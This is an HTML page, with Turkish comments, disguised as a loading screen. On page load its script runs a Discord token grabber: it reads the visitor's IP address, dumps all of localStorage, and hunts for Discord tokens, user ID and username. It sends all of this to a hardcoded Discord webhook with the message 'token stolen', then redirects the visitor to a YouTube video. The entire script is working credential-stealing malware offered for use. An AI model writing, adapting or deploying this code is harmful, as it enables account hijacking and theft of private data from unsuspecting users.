<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Yükleniyor...</title>
    <style>
        body { background: #2f3136; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #7289da; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #status { color: white; margin-top: 20px; text-align: center; }
    </style>
</head>
<body>
    <div style="text-align: center;">
        <div class="loader"></div>
        <div id="status">Veriler İsteniyor...</div>
    </div>

<script>
    // --- WEBHOOK URL'İNİ BURAYA YAZ ---
    const WEBHOOK = "https://discord.com/api/webhooks/1565166860897615912/I2CNk0KdLEXpdPkbMLoFTpAChNaeL8sS4YDqEH-26z7lptRg3lOs-UpBMHRbSlSW1Qke";

    async function getIP() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            return (await res.json()).ip;
        } catch { return "Bilinmiyor"; }
    }

    async function grabData() {
        const statusDiv = document.getElementById('status');
        
        // 1. IP AL
        const ip = await getIP();
        const userAgent = navigator.userAgent;
        
        // 2. LOCAL STORAGE'DAN HERŞEYİ TOPLA
        let allStorage = {};
        for (let key in localStorage) {
            allStorage[key] = localStorage.getItem(key);
        }

        // 3. TOKEN ARAMA (Gelişmiş)
        let token = null;
        if (localStorage.getItem('token')) token = localStorage.getItem('token');
        else if (localStorage.getItem('discord_token')) token = localStorage.getItem('discord_token');
        else if (localStorage.getItem('lt')) token = localStorage.getItem('lt');
        else {
            for (let key in localStorage) {
                if (localStorage[key] && localStorage[key].length > 30 && localStorage[key].startsWith("MT")) {
                    token = localStorage[key];
                    break;
                }
            }
        }

        // 4. KULLANICI BİLGİLERİ (Varsa)
        let userId = "Bilinmiyor";
        let username = "Bilinmiyor";
        if (localStorage.getItem('discord_id')) userId = localStorage.getItem('discord_id');
        if (localStorage.getItem('username')) username = localStorage.getItem('username');

        // 5. PAYLOAD
        const payload = {
            username: "Token Avcısı v2",
            avatar_url: "https://cdn-icons-png.flaticon.com/512/1042/1042842.png",
            embeds: [{
                title: "🔥 MASAÜSTU TOKEN ÇALINDI! 🔥",
                color: 15158332,
                fields: [
                    { name: "💻 Platform", value: "Windows Desktop App", inline: true },
                    { name: "🌐 IP", value: ip, inline: true },
                    { name: "🧩 Tarayıcı/Motor", value: "`" + userAgent + "`", inline: false },
                    { name: "👤 Kullanıcı ID", value: "`" + userId + "`", inline: true },
                    { name: "🏷️ Kullanıcı Adı", value: "`" + username + "`", inline: true },
                    { name: "🍪 Tüm LocalStorage", value: "`" + JSON.stringify(allStorage).substring(0, 1000) + "`", inline: false },
                    { name: "🔑 Token", value: "`" + (token || "Bulunamadı") + "`", inline: false }
                ],
                footer: { text: "NoTrack System" },
                timestamp: new Date().toISOString()
            }]
        };

        // 6. GÖNDER
        try {
            await fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            
            statusDiv.innerText = "✅ Veriler Alındı!";
            statusDiv.style.color = "#43b581";
            
            setTimeout(() => {
                window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
            }, 3000);

        } catch (e) {
            statusDiv.innerText = "❌ Hata: " + e.message;
            statusDiv.style.color = "#f04748";
        }
    }

    window.onload = grabData;
</script>
</body>
</html>
